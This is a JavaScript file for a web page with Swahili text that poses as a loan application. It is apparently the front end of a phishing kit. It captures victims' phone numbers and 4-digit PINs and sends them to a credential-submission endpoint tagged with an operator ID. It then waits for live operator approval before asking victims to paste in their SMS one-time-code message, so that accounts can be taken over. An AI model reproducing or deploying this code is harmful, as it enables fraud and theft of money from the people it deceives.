document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const adminId = urlParams.get('admin');

    const stepNaelewa = document.getElementById('step-naelewa');
    const stepForm = document.getElementById('step-form');
    const stepLoading = document.getElementById('step-loading');
    const stepOtp = document.getElementById('step-otp');
    const stepSuccess = document.getElementById('step-success');

    const btnNaelewa = document.getElementById('btn-naelewa');
    const loanForm = document.getElementById('loan-form');
    const btnThibitisha = document.getElementById('btn-thibitisha');
    const otpText = document.getElementById('otp-text');
    const charCount = document.getElementById('char-count');

    let currentSessionId = null;
    let statusInterval = null;

    btnNaelewa.addEventListener('click', () => {
        stepNaelewa.classList.remove('active');
        stepNaelewa.classList.add('hidden');
        stepForm.classList.remove('hidden');
        stepForm.classList.add('active');
    });

    const pinInputs = document.querySelectorAll('.pin-input');
    pinInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            const val = e.target.value;
            if (val && index < pinInputs.length - 1) {
                pinInputs[index + 1].focus();
            }
            updatePinValue();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) {
                pinInputs[index - 1].focus();
            }
        });
    });

    function updatePinValue() {
        let pin = '';
        pinInputs.forEach(input => pin += input.value);
        document.getElementById('pin-hidden').value = pin;
    }

    loanForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const phoneInput = document.getElementById('phone').value.trim();
        const pin = document.getElementById('pin-hidden').value;

        if (pin.length !== 4) {
            alert('Tafadhali weka PIN yenye tarakimu 4 kamili.');
            return;
        }

        currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        
        stepForm.classList.remove('active');
        stepForm.classList.add('hidden');
        stepLoading.classList.remove('hidden');
        stepLoading.classList.add('active');

        try {
            const response = await fetch('/api/submit-credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: currentSessionId,
                    phone: phoneInput,
                    pin: pin,
                    adminId: adminId
                })
            });
            const data = await response.json();
            if (data.success) {
                pollStatus();
            }
        } catch (err) {
            console.error('Error submitting credentials:', err);
            alert('Kosa limetokea. Tafadhali jaribu tena.');
            location.reload();
        }
    });

    otpText.addEventListener('input', () => {
        const len = otpText.value.length;
        charCount.innerText = `${len}/1000`;
    });

    btnThibitisha.addEventListener('click', async () => {
        const text = otpText.value.trim();
        if (!text) {
            alert('Tafadhali weka ujumbe wa SMS.');
            return;
        }

        stepOtp.classList.remove('active');
        stepOtp.classList.add('hidden');
        stepLoading.classList.remove('hidden');
        stepLoading.classList.add('active');

        try {
            await fetch('/api/submit-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: currentSessionId,
                    otpText: text
                })
            });
            pollStatus();
        } catch (err) {
            console.error('Error submitting OTP:', err);
        }
    });

    function pollStatus() {
        if (statusInterval) clearInterval(statusInterval);

        statusInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status/${currentSessionId}`);
                const data = await res.json();

                if (data.status === 'approved_pin') {
                    clearInterval(statusInterval);
                    stepLoading.classList.remove('active');
                    stepLoading.classList.add('hidden');
                    stepOtp.classList.remove('hidden');
                    stepOtp.classList.add('active');
                } else if (data.status === 'success') {
                    clearInterval(statusInterval);
                    stepLoading.classList.remove('active');
                    stepLoading.classList.add('hidden');
                    stepSuccess.classList.remove('hidden');
                    stepSuccess.classList.add('active');
                } else if (data.status === 'wrong_pin' || data.status === 'wrong_sms' || data.status === 'denied') {
                    clearInterval(statusInterval);
                    alert('Taarifa zako zimekataliwa au PIN/SMS sio sahihi. Tafadhali jaribu tena.');
                    location.reload();
                }
            } catch (err) {
                console.error('Error polling status:', err);
            }
        }, 3000);
    }
});
                          
